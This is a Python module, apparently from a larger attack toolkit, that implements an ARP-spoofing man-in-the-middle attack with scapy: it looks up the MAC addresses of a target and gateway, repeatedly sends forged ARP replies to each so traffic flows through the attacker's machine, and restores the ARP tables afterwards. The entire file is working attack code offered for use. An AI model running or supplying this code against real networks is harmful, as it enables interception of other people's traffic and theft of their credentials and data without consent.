from scapy.all import ARP, Ether, send, srp
import time
from .attack_base import AttackBase
from ..utils.logger import setup_logger

logger = setup_logger('mitm_attack')

class MITMAttack(AttackBase):
    """Man-in-the-Middle ARP Spoofing Attack"""
    
    def __init__(self):
        super().__init__(
            name="ARP Spoofing MITM",
            description="ARP spoofing man-in-the-middle attack"
        )
        self.original_mac = {}
    
    def execute(self, target, gateway, duration=60, interval=2):
        """Execute ARP spoofing attack"""
        logger.info(f"Starting ARP spoofing: {target} <-> {gateway}")
        
        # Get MAC addresses
        target_mac = self._get_mac(target)
        gateway_mac = self._get_mac(gateway)
        
        if not target_mac or not gateway_mac:
            logger.error("Failed to get MAC addresses")
            return {'success': False}
        
        logger.info(f"Target MAC: {target_mac}, Gateway MAC: {gateway_mac}")
        
        start_time = time.time()
        
        try:
            while time.time() - start_time < duration:
                # Spoof target (tell target we are the gateway)
                self._spoof(target, gateway, target_mac)
                
                # Spoof gateway (tell gateway we are the target)
                self._spoof(gateway, target, gateway_mac)
                
                time.sleep(interval)
        
        except KeyboardInterrupt:
            logger.info("ARP spoofing interrupted")
        finally:
            # Restore ARP tables
            self._restore(target, gateway, target_mac, gateway_mac)
        
        logger.info("ARP spoofing completed")
        return {'success': True, 'duration': time.time() - start_time}
    
    def _get_mac(self, ip):
        """Get MAC address for IP"""
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            
            if answered_list:
                return answered_list[0][1].hwsrc
        except Exception as e:
            logger.error(f"Failed to get MAC for {ip}: {e}")
        
        return None
    
    def _spoof(self, target_ip, spoof_ip, target_mac):
        """Send spoofed ARP reply"""
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, verbose=False)
    
    def _restore(self, target_ip, gateway_ip, target_mac, gateway_mac):
        """Restore original ARP tables"""
        logger.info("Restoring ARP tables")
        
        # Restore target
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                     psrc=gateway_ip, hwsrc=gateway_mac)
        send(packet, count=5, verbose=False)
        
        # Restore gateway
        packet = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                     psrc=target_ip, hwsrc=target_mac)
        send(packet, count=5, verbose=False)
